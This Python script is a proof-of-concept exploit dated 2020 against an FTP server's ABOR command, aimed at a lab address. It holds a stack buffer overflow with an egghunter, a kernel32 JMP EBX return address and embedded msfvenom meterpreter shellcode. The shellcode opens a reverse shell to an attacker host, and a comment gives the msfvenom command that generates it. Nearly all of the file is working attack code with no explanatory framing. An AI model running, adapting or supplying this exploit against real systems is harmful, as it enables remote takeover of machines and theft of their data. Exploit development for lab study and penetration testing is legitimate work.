#!/usr/bin/env python3

import socket
import sys
import os
import time

ip = "192.168.56.132"
port = 21

#EIP overwritten after 1063 bytes
# JMP EBX (7C8192BA) address in module kernel32.dll
# bad chars = \x00\x0a\x0d\xff
# Msfvenom payload:
# msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.56.131 LPORT=53 -f c -b '\x00\x0d\x0a\xff'
# 402 bytes
# Egghunter , tag n00b : 
# "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
# "\xef\xb8\x6e\x30\x30\x62\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# Put this tag in front of your shellcode : n00bn00b

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x6e\x30\x30\x62\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

shellcode = ("n00bn00b" +
"\xbe\xb9\xae\x0f\x45\xdb\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x5e\x83\xe8\xfc\x31\x70\x11\x03\x70\x11\xe2\x4c\x52\xe7\xca"
"\xae\xab\xf8\xb4\x9f\x79\x9c\xbf\x8d\x4d\xd4\x25\xba\xfc\xea"
"\x2e\xee\x14\xfc\x87\x44\x33\x33\x17\xd3\x49\x1b\xd6\x23\x01"
"\x67\x79\xdf\x58\xb4\x59\xde\x92\xc9\x98\x27\x65\xa7\x75\xf5"
"\xfd\x15\x9a\x72\x43\xa6\xcd\x85\x94\x5d\xb1\xfd\x91\xa2\x46"
"\xb1\x98\xf2\x2c\x11\xbb\x79\x7a\xb9\xba\xae\x2b\x3c\x75\x24"
"\xf0\x0f\x79\x8c\x83\x5b\x0e\x0e\x42\x92\xd0\xbd\xab\x1b\xdd"
"\xbc\xec\x9b\x3e\xcb\x06\xd8\xc3\xcc\xdc\xa3\x1f\x58\xc3\x03"
"\xeb\xfa\x27\xb2\x38\x9c\xac\xb8\xf5\xea\xeb\xdc\x08\x3e\x80"
"\xd8\x81\xc1\x47\x69\xd1\xe5\x43\x32\x81\x84\xd2\x9e\x64\xb8"
"\x05\x46\xd8\x1c\x4d\x64\x0f\x20\xae\x77\x30\x7c\x39\xb4\xfd"
"\x7f\xb9\xd2\x76\xf3\x8b\x7d\x2d\x9b\xa7\xf6\xeb\x5c\xb1\x10"
"\x0c\xb2\x79\x70\xf2\x33\x7a\x59\x31\x67\x2a\xf1\x90\x08\xa1"
"\x01\x1c\xdd\x5c\x0b\x8a\x1e\x08\x33\xc9\xf7\x4b\x43\xcd\x32"
"\xc5\xa5\x9d\x6c\x85\x79\x5e\xdd\x65\x29\x36\x37\x6a\x16\x26"
"\x38\xa0\x3f\xcd\xd7\x1d\x68\x7a\x41\x04\xe2\x1b\x8e\x92\x8f"
"\x1c\x04\x17\x70\xd2\xed\x52\x62\x03\x8a\x9c\x7a\xd4\x3f\x9d"
"\x10\xd0\xe9\xca\x8c\xda\xcc\x3d\x13\x24\x3b\x3e\x53\xda\xba"
"\x77\x28\xed\x28\x38\x46\x12\xbd\xb8\x96\x44\xd7\xb8\xfe\x30"
"\x83\xea\x1b\x3f\x1e\x9f\xb0\xaa\xa1\xf6\x65\x7c\xca\xf4\x50"
"\x4a\x55\x06\xb7\xc8\x92\xf8\x4a\xe7\x3a\x91\xb4\xb7\xba\x61"
"\xde\x37\xeb\x09\x15\x17\x04\xfa\xd6\xb2\x4d\x92\x5d\x53\x3f"
"\x03\x62\x7e\xe1\x9d\x63\x8d\x3a\x2d\x1e\xfe\xbd\xce\xdf\x16"
"\xda\xce\xe0\x16\xdc\xf3\x37\x2f\xaa\x32\x84\x14\xb5\xa8\x20"
"\x61\x5e\x75\xa1\xc8\x03\x86\x1c\x0e\x3a\x05\x94\xef\xb9\x15"
"\xdd\xea\x86\x91\x0e\x87\x97\x77\x30\x34\x97\x5d")

def exploit_faze():
	exploit = shellcode + '\x90' * (1063 - (len(shellcode) + len(egghunter))) + egghunter + '\xBA\x92\x81\x7C' + '\x90' * 205

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((ip,port))
	print(s.recv(1024))
	time.sleep(5)
	s.recv(2000)
	s.send(b'USER anonymous\r\n')
	print(s.recv(2000))
	s.send(b'PASS anonymous\r\n')
	print(s.recv(2000))
	s.send(bytes('ABOR ' + exploit + '\r\n','latin-1'))
	print("Exploit length is [%d] bytes\n" % len(exploit))
	s.close()
	print("--------------------------------------------------------------------\n")
	print("Exploit send Successfully!\n")
	print("Check your metasploit multi/handler listener\n")
	print("--------------------------------------------------------------------\n")

def main():
	print("--------------------------------------------------------------------\n")
	print("\t\t Proof Of Concept by N3R0 (2020)\n")
	print("--------------------------------------------------------------------\n")
	exploit_faze()

main()
